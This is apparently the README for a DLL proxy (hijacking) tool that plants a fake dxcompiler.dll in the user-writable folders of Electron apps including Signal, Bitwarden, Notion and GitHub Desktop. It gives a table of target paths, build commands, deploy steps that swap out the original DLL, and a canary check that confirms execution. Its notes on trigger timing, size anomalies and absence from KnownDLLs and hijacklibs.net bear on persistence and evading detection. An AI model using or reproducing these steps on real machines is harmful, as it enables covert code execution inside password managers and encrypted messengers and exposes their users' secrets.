# dxcompiler.dll — Universal Electron Proxy

## Overview

`dxcompiler.dll` is the DirectX Shader Compiler, bundled with virtually every
Electron application for GPU-accelerated rendering. It has only **2 exports**,
making it trivial to proxy.

One compiled DLL works against 10+ applications without modification.

## Confirmed Targets

All user-writable (`%LOCALAPPDATA%` or `%APPDATA%`):

| Application | Path |
|-------------|------|
| Signal | `%LOCALAPPDATA%\Programs\signal-desktop\` |
| Obsidian | `%LOCALAPPDATA%\Programs\Obsidian\` |
| Bitwarden | `%LOCALAPPDATA%\Programs\Bitwarden\` |
| Notion | `%LOCALAPPDATA%\Programs\Notion\` |
| Figma | `%LOCALAPPDATA%\Figma\app-*\` |
| Element | `%LOCALAPPDATA%\element-desktop\app-*\` |
| GitHub Desktop | `%LOCALAPPDATA%\GitHubDesktop\app-*\` |
| GitKraken | `%LOCALAPPDATA%\gitkraken\app-*\` |

## Build

```bash
# MinGW (cross-compile from macOS/Linux)
x86_64-w64-mingw32-gcc -shared -o dxcompiler.dll dxcompiler_proxy.c dxcompiler_proxy.def

# MinGW (native Windows)
gcc -shared -o dxcompiler.dll dxcompiler_proxy.c dxcompiler_proxy.def

# MSVC
cl /LD /Fe:dxcompiler.dll dxcompiler_proxy.c /link /DEF:dxcompiler_proxy.def
```

## Deploy

```
cd %LOCALAPPDATA%\Programs\signal-desktop
ren dxcompiler.dll dxcompiler_orig.dll
copy \\path\to\dxcompiler.dll .
```

## Verify

Launch the target app, then check:
```
type %TEMP%\lacuna_canary.txt
```

## Notes

- Trigger: application startup (GPU init loads dxcompiler immediately)
- The original DLL is ~24MB; the proxy is ~50KB (detectable size anomaly)
- App auto-updates via Squirrel may overwrite the proxy
- `dxcompiler.dll` is NOT in the Windows KnownDLLs list
- NOT listed on hijacklibs.net (as of June 2026)
